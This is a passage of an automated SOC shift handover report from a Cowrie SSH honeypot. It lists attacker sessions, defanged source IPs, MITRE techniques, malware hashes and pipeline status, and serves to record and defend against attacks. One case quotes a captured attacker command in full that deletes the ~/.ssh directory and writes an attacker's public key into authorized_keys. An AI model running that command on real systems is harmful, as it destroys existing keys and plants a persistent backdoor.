- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-281a94a6f7c6

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]198` |
| **First Seen** | 2026-05-13 13:53 |
| **Last Seen** | 2026-05-13 13:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 13:53:55` | `cowrie.session.connect` |
| `2026-05-13 13:53:55` | `cowrie.client.version` |
| `2026-05-13 13:53:55` | `cowrie.client.kex` |
| `2026-05-13 13:53:56` | `cowrie.login.success` |
| `2026-05-13 13:53:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]198` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ab3179e12eb

| Field | Detail |
|---|---|
| **Source IP** | `34.135.200[.]178` |
| **First Seen** | 2026-05-13 13:56 |
| **Last Seen** | 2026-05-13 13:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 13:56:02` | `cowrie.session.connect` |
| `2026-05-13 13:56:02` | `cowrie.client.version` |
| `2026-05-13 13:56:03` | `cowrie.client.kex` |
| `2026-05-13 13:56:04` | `cowrie.login.success` |
| `2026-05-13 13:56:04` | `cowrie.session.params` |
| `2026-05-13 13:56:04` | `cowrie.command.input` |
| `2026-05-13 13:56:04` | `cowrie.command.failed` |
| `2026-05-13 13:56:05` | `cowrie.log.closed` |
| `2026-05-13 13:56:05` | `cowrie.session.params` |
| `2026-05-13 13:56:05` | `cowrie.command.input` |
| `2026-05-13 13:56:05` | `cowrie.session.file_download` |
| `2026-05-13 13:56:05` | `cowrie.log.closed` |
| `2026-05-13 13:56:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.135.200[.]178` to AbuseIPDB if not already reported
- [ ] Block `34.135.200[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67c17bee80ac

| Field | Detail |
|---|---|
| **Source IP** | `34.135.200[.]178` |
| **First Seen** | 2026-05-13 13:56 |
| **Last Seen** | 2026-05-13 13:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 13:56:08` | `cowrie.session.connect` |
| `2026-05-13 13:56:08` | `cowrie.client.version` |
| `2026-05-13 13:56:08` | `cowrie.client.kex` |
| `2026-05-13 13:56:09` | `cowrie.login.success` |
| `2026-05-13 13:56:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.135.200[.]178` to AbuseIPDB if not already reported
- [ ] Block `34.135.200[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfc78bb8b836

| Field | Detail |
|---|---|
| **Source IP** | `213.195.112[.]227` |
| **First Seen** | 2026-05-13 14:36 |
| **Last Seen** | 2026-05-13 14:37 |
| **Session Duration** | 67s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 14:36:28` | `cowrie.session.connect` |
| `2026-05-13 14:36:46` | `cowrie.client.version` |
| `2026-05-13 14:36:46` | `cowrie.client.kex` |
| `2026-05-13 14:37:29` | `cowrie.login.success` |
| `2026-05-13 14:37:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.195.112[.]227` to AbuseIPDB if not already reported
- [ ] Block `213.195.112[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `23.94.77[.]145` | **89** | 2026-05-13 10:35 | 2026-05-13 14:42 | 44m | 0 | `T1592` | 🟠 MEDIUM |
| `57.128.182[.]5` | **6** | 2026-05-13 10:40 | 2026-05-13 10:48 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `95.219.223[.]162` | **5** | 2026-05-13 11:39 | 2026-05-13 11:49 | 10m | 0 | `T1592` | 🟢 LOW |
| `8.216.10[.]5` | **4** | 2026-05-13 12:47 | 2026-05-13 12:48 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `114.242.24[.]31` | **2** | 2026-05-13 12:59 | 2026-05-13 13:01 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `181.116.220[.]140` | **2** | 2026-05-13 11:15 | 2026-05-13 11:15 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `213.195.112[.]227` | **2** | 2026-05-13 14:32 | 2026-05-13 14:35 | 1m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `27.79.42[.]144` | **2** | 2026-05-13 11:11 | 2026-05-13 11:13 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `3.130.168[.]2` | **2** | 2026-05-13 13:03 | 2026-05-13 13:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.148.120[.]187` | **2** | 2026-05-13 12:15 | 2026-05-13 12:24 | 1m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]214` | **2** | 2026-05-13 12:30 | 2026-05-13 12:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.130[.]208` | 1 | 2026-05-13 14:00 | 2026-05-13 14:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.126.91[.]34` | 1 | 2026-05-13 13:01 | 2026-05-13 13:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.36.119[.]184` | 1 | 2026-05-13 13:02 | 2026-05-13 13:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.36.122[.]186` | 1 | 2026-05-13 11:42 | 2026-05-13 11:42 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.134.154[.]138` | 1 | 2026-05-13 11:13 | 2026-05-13 11:13 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.147.40[.]93` | 1 | 2026-05-13 13:01 | 2026-05-13 13:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.31.210[.]125` | 1 | 2026-05-13 11:08 | 2026-05-13 11:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.117.251[.]230` | 1 | 2026-05-13 14:31 | 2026-05-13 14:31 | 31s | 0 | `T1592` | 🟢 LOW |
| `125.91.140[.]135` | 1 | 2026-05-13 13:03 | 2026-05-13 13:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]195` | 1 | 2026-05-13 13:09 | 2026-05-13 13:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]69` | 1 | 2026-05-13 14:13 | 2026-05-13 14:15 | 94s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]198` | 1 | 2026-05-13 13:53 | 2026-05-13 13:53 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `160.154.103[.]254` | 1 | 2026-05-13 11:26 | 2026-05-13 11:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `189.244.42[.]190` | 1 | 2026-05-13 11:12 | 2026-05-13 11:12 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `196.204.71[.]189` | 1 | 2026-05-13 13:55 | 2026-05-13 13:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.105.172[.]184` | 1 | 2026-05-13 13:06 | 2026-05-13 13:06 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `221.161.235[.]168` | 1 | 2026-05-13 13:07 | 2026-05-13 13:07 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `24.157.18[.]228` | 1 | 2026-05-13 12:23 | 2026-05-13 12:23 | 13s | 0 | `T1592` | 🟢 LOW |
| `27.79.42[.]177` | 1 | 2026-05-13 11:13 | 2026-05-13 11:13 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.135.200[.]178` | 1 | 2026-05-13 13:56 | 2026-05-13 13:56 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.110.172[.]218` | 1 | 2026-05-13 13:57 | 2026-05-13 13:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `54.174.208[.]37` | 1 | 2026-05-13 12:57 | 2026-05-13 12:57 | 1s | 0 | `T1592` | 🟢 LOW |
| `61.240.156[.]16` | 1 | 2026-05-13 12:59 | 2026-05-13 13:00 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `80.253.31[.]232` | 1 | 2026-05-13 13:06 | 2026-05-13 13:06 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.231.206[.]1` | 1 | 2026-05-13 13:53 | 2026-05-13 13:53 | 3s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]35` | 1 | 2026-05-13 13:56 | 2026-05-13 13:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]4` | 1 | 2026-05-13 13:53 | 2026-05-13 13:53 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **31/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `122.117.251[.]230` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 10 |
| `8.216.10[.]5` | JP | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 31 |
| `94.231.206[.]1` | SG | FR ONYPHE | **100** ⚠️ | 50 |
| `24.157.18[.]228` | PR | Liberty Communications of Puerto Rico LLC | **100** ⚠️ | 3 |
| `196.204.71[.]189` | EG | Local ISP | **100** ⚠️ | 50 |
| `35.200.126[.]118` | JP | Google LLC | **100** ⚠️ | 1 |
| `94.231.206[.]35` | SG | FR ONYPHE | **100** ⚠️ | 48 |
| `61.240.156[.]16` | CN | China Unicom | **100** ⚠️ | 50 |
| `213.195.112[.]227` | ES | WWW Ibercom Net | **100** ⚠️ | 2 |
| `101.36.122[.]186` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 45 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 67 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 30 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 24 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 13 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 13 |

---

## 🔕 False Positive Summary (22 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 7 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 197 cases |
| Tool 34  | Credential Extractor        | ✅ 55 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 56 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 22 filtered (11.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 41 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 30 priority case(s) shown individually · 38 recon entry/entries in table (11 group(s) consolidating 118 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-13T14:43:51Z_
